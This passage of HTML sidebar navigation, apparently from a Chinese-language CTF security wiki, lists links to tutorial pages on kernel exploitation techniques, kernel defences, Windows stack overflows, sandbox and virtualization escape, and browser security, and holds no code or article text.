<a href=../../../summary/get-address/ class=md-nav__link> 获取地址 </a> </li> <li class=md-nav__item> <a href=../../../summary/hijack-control-flow/ class=md-nav__link> 控制程序执行流 </a> </li> <li class=md-nav__item> <a href=../../../summary/get-shell/ class=md-nav__link> shell 获取小结 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2 type=checkbox id=nav-9-1-2> <label class=md-nav__link for=nav-9-1-2> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-2> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-1 type=checkbox id=nav-9-1-2-1> <label class=md-nav__link for=nav-9-1-2-1> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-2-1> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/build-kernel/ class=md-nav__link> 内核源码下载与编译 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/build-kernel-module/ class=md-nav__link> 编写一个 Loadable Kernel Module </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/qemu-emulate/ class=md-nav__link> 搭建内核运行环境 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/real-device/ class=md-nav__link> Real Device </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/environment/System.map/ class=md-nav__link> System.map </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-2 type=checkbox id=nav-9-1-2-2> <label class=md-nav__link for=nav-9-1-2-2> Basic Knowledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basic Knowledge" data-md-level=4> <label class=md-nav__title for=nav-9-1-2-2> <span class="md-nav__icon md-icon"></span> Basic Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/basic-knowledge/ class=md-nav__link> Introduction to Linux kernel </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3 type=checkbox id=nav-9-1-2-3> <label class=md-nav__link for=nav-9-1-2-3> Aim <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Aim data-md-level=4> <label class=md-nav__title for=nav-9-1-2-3> <span class="md-nav__icon md-icon"></span> Aim </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3-2 type=checkbox id=nav-9-1-2-3-2> <label class=md-nav__link for=nav-9-1-2-3-2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-3-2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/privilege-escalation/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/privilege-escalation/change-self/ class=md-nav__link> Change Self </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/privilege-escalation/change-others/ class=md-nav__link> Change Others </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/info-leak/ class=md-nav__link> Information Disclosure </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/aim/dos/ class=md-nav__link> DoS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4 type=checkbox id=nav-9-1-2-4> <label class=md-nav__link for=nav-9-1-2-4> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-2-4> <span class="md-nav__icon md-icon"></span> Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2 type=checkbox id=nav-9-1-2-4-2> <label class=md-nav__link for=nav-9-1-2-4-2> Isolation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Isolation data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-2> <span class="md-nav__icon md-icon"></span> Isolation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-2 type=checkbox id=nav-9-1-2-4-2-2> <label class=md-nav__link for=nav-9-1-2-4-2-2> User and Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User and Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-2> <span class="md-nav__icon md-icon"></span> User and Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/user-code-execution/ class=md-nav__link> 用户代码不可执行 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/user-data-access/ class=md-nav__link> 用户数据不可访问 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/user-kernel/kpti/ class=md-nav__link> KPTI - Kernel Page Table Isolation </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-3 type=checkbox id=nav-9-1-2-4-2-3> <label class=md-nav__link for=nav-9-1-2-4-2-3> Inside Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Inside Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-3> <span class="md-nav__icon md-icon"></span> Inside Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/isolation/inner-kernel/heap-chunk/ class=md-nav__link> 内部隔离 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-3 type=checkbox id=nav-9-1-2-4-3> <label class=md-nav__link for=nav-9-1-2-4-3> Access Control <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Access Control" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-3> <span class="md-nav__icon md-icon"></span> Access Control </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/access-control/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/access-control/information-disclosure/ class=md-nav__link> 信息泄漏 </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/access-control/misc/ class=md-nav__link> Misc </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-4 type=checkbox id=nav-9-1-2-4-4> <label class=md-nav__link for=nav-9-1-2-4-4> Detection <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Detection data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-4> <span class="md-nav__icon md-icon"></span> Detection </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/detection/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/detection/canary/ class=md-nav__link> Kernel Stack Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-5 type=checkbox id=nav-9-1-2-4-5> <label class=md-nav__link for=nav-9-1-2-4-5> Randomization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Randomization data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-5> <span class="md-nav__icon md-icon"></span> Randomization </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/randomization/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/randomization/kaslr/ class=md-nav__link> KASLR </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/defense/randomization/fgkaslr/ class=md-nav__link> FGKASLR </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5 type=checkbox id=nav-9-1-2-5> <label class=md-nav__link for=nav-9-1-2-5> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-2-5> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-1 type=checkbox id=nav-9-1-2-5-1> <label class=md-nav__link for=nav-9-1-2-5-1> Returned Oriented Programming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Returned Oriented Programming" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-1> <span class="md-nav__icon md-icon"></span> Returned Oriented Programming </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/rop/ class=md-nav__link> Kernel ROP </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/kpti-bypass/ class=md-nav__link> Kernel ROP with KPTI bypass </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/ret2usr/ class=md-nav__link> ret2usr（已过时） </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/bypass-smep/ class=md-nav__link> bypass-smep （已过时） </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/ret2ptregs/ class=md-nav__link> 利用 pt_regs 构造通用内核 ROP </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/rop/ret2dir/ class=md-nav__link> ret2dir </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2 type=checkbox id=nav-9-1-2-5-2> <label class=md-nav__link for=nav-9-1-2-5-2> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-2> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/heap_overview/ class=md-nav__link> 内核堆概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2-2 type=checkbox id=nav-9-1-2-5-2-2> <label class=md-nav__link for=nav-9-1-2-5-2-2> slub allocator <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="slub allocator" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-2-2> <span class="md-nav__icon md-icon"></span> slub allocator </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/slub/uaf/ class=md-nav__link> kernel UAF </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/slub/spray/ class=md-nav__link> Heap Spray </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/slub/freelist/ class=md-nav__link> freelist 劫持 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2-3 type=checkbox id=nav-9-1-2-5-2-3> <label class=md-nav__link for=nav-9-1-2-5-2-3> Buddy System <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Buddy System" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-2-3> <span class="md-nav__icon md-icon"></span> Buddy System </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/buddy/cross-cache/ class=md-nav__link> Cross-Cache Overflow &amp; Page-level Heap Fengshui </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/heap/buddy/page-uaf/ class=md-nav__link> Page-level UAF </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3 type=checkbox id=nav-9-1-2-5-3> <label class=md-nav__link for=nav-9-1-2-5-3> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-3> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/race/double-fetch/ class=md-nav__link> Double Fetch </a> </li> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/race/userfaultfd/ class=md-nav__link> 用 userfaultfd 创造条件竞争 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-4 type=checkbox id=nav-9-1-2-5-4> <label class=md-nav__link for=nav-9-1-2-5-4> Tricks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tricks data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-4> <span class="md-nav__icon md-icon"></span> Tricks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../kernel-mode/exploitation/tricks/initramfs/ class=md-nav__link> 在内存中直接搜索 flag </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2 type=checkbox id=nav-9-2> <label class=md-nav__link for=nav-9-2> Windows Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Platform" data-md-level=2> <label class=md-nav__title for=nav-9-2> <span class="md-nav__icon md-icon"></span> Windows Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/readme/ class=md-nav__link> 概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2 type=checkbox id=nav-9-2-2> <label class=md-nav__link for=nav-9-2-2> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-2> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/user-mode/readme/ class=md-nav__link> Readme </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2-2 type=checkbox id=nav-9-2-2-2> <label class=md-nav__link for=nav-9-2-2-2> 栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=栈溢出 data-md-level=4> <label class=md-nav__title for=nav-9-2-2-2> <span class="md-nav__icon md-icon"></span> 栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/stack-introduction/ class=md-nav__link> 栈介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/stackoverflow-basic/ class=md-nav__link> 栈溢出原理 </a> </li> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/shellcode-in-stack/ class=md-nav__link> 执行 Shellcode </a> </li> <li class=md-nav__item> <a href=../../../../../windows/user-mode/stackoverflow/ret2dll/ class=md-nav__link> ret2dll利用 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3 type=checkbox id=nav-9-2-3> <label class=md-nav__link for=nav-9-2-3> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-3> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3-1 type=checkbox id=nav-9-2-3-1> <label class=md-nav__link for=nav-9-2-3-1> Basic Knowledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basic Knowledge" data-md-level=4> <label class=md-nav__title for=nav-9-2-3-1> <span class="md-nav__icon md-icon"></span> Basic Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../windows/kernel-mode/basic-knowledge/introduction/ class=md-nav__link> 基础知识 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-3 type=checkbox id=nav-9-3> <label class=md-nav__link for=nav-9-3> MacOS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="MacOS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-3> <span class="md-nav__icon md-icon"></span> MacOS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../macos/readme/ class=md-nav__link> MacOS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-4 type=checkbox id=nav-9-4> <label class=md-nav__link for=nav-9-4> Misc OS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Misc OS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-4> <span class="md-nav__icon md-icon"></span> Misc OS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../misc-os/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5 type=checkbox id=nav-9-5> <label class=md-nav__link for=nav-9-5> Sandbox Escape <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Sandbox Escape" data-md-level=2> <label class=md-nav__title for=nav-9-5> <span class="md-nav__icon md-icon"></span> Sandbox Escape </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-1 type=checkbox id=nav-9-5-1> <label class=md-nav__link for=nav-9-5-1> python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=python data-md-level=3> <label class=md-nav__title for=nav-9-5-1> <span class="md-nav__icon md-icon"></span> python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/python/python-sandbox-escape/ class=md-nav__link> Python 沙盒 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-2 type=checkbox id=nav-9-5-2> <label class=md-nav__link for=nav-9-5-2> shell <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=shell data-md-level=3> <label class=md-nav__title for=nav-9-5-2> <span class="md-nav__icon md-icon"></span> shell </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/shell/readme/ class=md-nav__link> Shell Sandbox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-3 type=checkbox id=nav-9-5-3> <label class=md-nav__link for=nav-9-5-3> seccomp <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=seccomp data-md-level=3> <label class=md-nav__title for=nav-9-5-3> <span class="md-nav__icon md-icon"></span> seccomp </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/seccomp/c-sandbox-escape/ class=md-nav__link> C 沙盒逃逸 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-4 type=checkbox id=nav-9-5-4> <label class=md-nav__link for=nav-9-5-4> namespace <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=namespace data-md-level=3> <label class=md-nav__title for=nav-9-5-4> <span class="md-nav__icon md-icon"></span> namespace </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/namespace/readme/ class=md-nav__link> Namespace </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-5 type=checkbox id=nav-9-5-5> <label class=md-nav__link for=nav-9-5-5> chroot <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=chroot data-md-level=3> <label class=md-nav__title for=nav-9-5-5> <span class="md-nav__icon md-icon"></span> chroot </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/chroot/readme/ class=md-nav__link> Chroot </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-6 type=checkbox id=nav-9-5-6> <label class=md-nav__link for=nav-9-5-6> docker <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=docker data-md-level=3> <label class=md-nav__title for=nav-9-5-6> <span class="md-nav__icon md-icon"></span> docker </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../sandbox/docker/readme/ class=md-nav__link> Docker </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6 type=checkbox id=nav-9-6> <label class=md-nav__link for=nav-9-6> Virtualization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Virtualization data-md-level=2> <label class=md-nav__title for=nav-9-6> <span class="md-nav__icon md-icon"></span> Virtualization </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-1 type=checkbox id=nav-9-6-1> <label class=md-nav__link for=nav-9-6-1> 基础知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础知识 data-md-level=3> <label class=md-nav__title for=nav-9-6-1> <span class="md-nav__icon md-icon"></span> 基础知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/basic-knowledge/ class=md-nav__link> 虚拟化技术简介 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/cpu-virtualization/ class=md-nav__link> CPU 虚拟化 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/mem-virtualization/ class=md-nav__link> 内存虚拟化 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/basic-knowledge/io-virtualization/ class=md-nav__link> IO 虚拟化 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2 type=checkbox id=nav-9-6-2> <label class=md-nav__link for=nav-9-6-2> QEMU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=QEMU data-md-level=3> <label class=md-nav__title for=nav-9-6-2> <span class="md-nav__icon md-icon"></span> QEMU </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-1 type=checkbox id=nav-9-6-2-1> <label class=md-nav__link for=nav-9-6-2-1> 基础知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础知识 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-1> <span class="md-nav__icon md-icon"></span> 基础知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/basic-knowledge/mm/ class=md-nav__link> QEMU 内存管理 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/basic-knowledge/dev/ class=md-nav__link> QEMU 设备模拟 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-2 type=checkbox id=nav-9-6-2-2> <label class=md-nav__link for=nav-9-6-2-2> 环境搭建 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=环境搭建 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-2> <span class="md-nav__icon md-icon"></span> 环境搭建 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/environment/build-qemu/ class=md-nav__link> QEMU 下载与编译 </a> </li> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/environment/build-qemu-dev/ class=md-nav__link> 编写 QEMU 模拟设备 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-3 type=checkbox id=nav-9-6-2-3> <label class=md-nav__link for=nav-9-6-2-3> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-6-2-3> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/qemu/exploitation/intro/ class=md-nav__link> QEMU 逃逸入门 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-3 type=checkbox id=nav-9-6-3> <label class=md-nav__link for=nav-9-6-3> Virtual Box <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Virtual Box" data-md-level=3> <label class=md-nav__title for=nav-9-6-3> <span class="md-nav__icon md-icon"></span> Virtual Box </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/virtualbox/readme/ class=md-nav__link> VirtualBox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-4 type=checkbox id=nav-9-6-4> <label class=md-nav__link for=nav-9-6-4> VMWare <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=VMWare data-md-level=3> <label class=md-nav__title for=nav-9-6-4> <span class="md-nav__icon md-icon"></span> VMWare </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/vmware/readme/ class=md-nav__link> VMWare </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-5 type=checkbox id=nav-9-6-5> <label class=md-nav__link for=nav-9-6-5> Parallels <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Parallels data-md-level=3> <label class=md-nav__title for=nav-9-6-5> <span class="md-nav__icon md-icon"></span> Parallels </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../virtualization/parallels/readmd/ class=md-nav__link> Parallels </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7 type=checkbox id=nav-9-7> <label class=md-nav__link for=nav-9-7> Browser <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Browser data-md-level=2> <label class=md-nav__title for=nav-9-7> <span class="md-nav__icon md-icon"></span> Browser </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-1 type=checkbox id=nav-9-7-1> <label class=md-nav__link for=nav-9-7-1> Chrome <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Chrome data-md-level=3> <label class=md-nav__title for=nav-9-7-1> <span class="md-nav__icon md-icon"></span> Chrome </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../browser/chrome/readme/ class=md-nav__link> Chrome </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-2 type=checkbox id=nav-9-7-2> <label class=md-nav__link for=nav-9-7-2> Firefox <span class="md-nav__icon md-icon"></span> </label> <nav 